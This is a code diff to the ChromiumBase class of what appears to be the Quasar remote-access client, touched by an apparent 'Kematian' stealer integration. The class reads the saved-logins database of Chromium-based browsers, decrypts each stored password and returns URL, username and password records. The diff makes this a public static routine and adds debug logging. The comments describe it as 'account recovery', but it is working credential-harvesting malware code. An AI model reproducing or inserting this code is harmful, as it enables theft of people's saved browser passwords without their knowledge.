@@ -1,21 +1,19 @@
-﻿using Quasar.Client.Recovery.Utilities;
+﻿using Quasar.Client.Kematian.Browsers.Helpers.Structs;
+using Quasar.Client.Recovery.Utilities;
 using Quasar.Common.Models;
 using System;
 using System.Collections.Generic;
+using System.Diagnostics;
 using System.IO;
+using System.Web.UI.WebControls;
 
 namespace Quasar.Client.Recovery.Browsers
 {
     /// <summary>
     /// Provides basic account recovery capabilities from chromium-based applications.
     /// </summary>
-    public abstract class ChromiumBase : IAccountReader
+    public class ChromiumBase
     {
-        /// <inheritdoc />
-        public abstract string ApplicationName { get; }
-
-        /// <inheritdoc />
-        public abstract IEnumerable<RecoveredAccount> ReadAccounts();
 
         /// <summary>
         /// Reads the stored accounts of an chromium-based application.
@@ -23,9 +21,18 @@ namespace Quasar.Client.Recovery.Browsers
         /// <param name="filePath">The file path of the logins database.</param>
         /// <param name="localStatePath">The file path to the local state.</param>
         /// <returns>A list of recovered accounts.</returns>
-        protected List<RecoveredAccount> ReadAccounts(string filePath, string localStatePath)
+        public static List<RecoveredAccount> ReadAccounts(string filePath, string localStatePath, string appName)
         {
             var result = new List<RecoveredAccount>();
+
+            if (appName == "Local")
+            {
+                return result;
+            }
+
+            Debug.WriteLine(filePath);
+            Debug.WriteLine(localStatePath);
+            Debug.WriteLine(appName);
 
             if (File.Exists(filePath))
             {
@@ -52,31 +59,29 @@ namespace Quasar.Client.Recovery.Browsers
                 {
                     try
                     {
+
                         var host = sqlDatabase.GetValue(i, "origin_url");
+                        //Debug.WriteLine(host);
                         var user = sqlDatabase.GetValue(i, "username_value");
-                        var value = sqlDatabase.GetValue(i, "password_value");
+                        //Debug.WriteLine(user);
+                        var value = decryptor.Decrypt(sqlDatabase.GetValue(i, "password_value"));
+                        //Debug.WriteLine(value);
 
-                        if (value == "")
-                        {
+                        if (string.IsNullOrEmpty(host) || string.IsNullOrEmpty(user) || string.IsNullOrEmpty(value))
                             continue;
-                        }
 
-                        var pass = decryptor.Decrypt(value);
-
-                        if (!string.IsNullOrEmpty(host) && !string.IsNullOrEmpty(user))
+                        result.Add(new RecoveredAccount
                         {
-                            result.Add(new RecoveredAccount
-                            {
-                                Url = host,
-                                Username = user,
-                                Password = pass,
-                                Application = ApplicationName
-                            });
-                        }
+                            Url = host,
+                            Username = user,
+                            Password = value,
+                            Application = appName
+                        });
+
                     }
-                    catch (Exception)
+                    catch (Exception e)
                     {
-                        // ignore invalid entry
+                        Debug.WriteLine(e);
                     }
                 }
             }
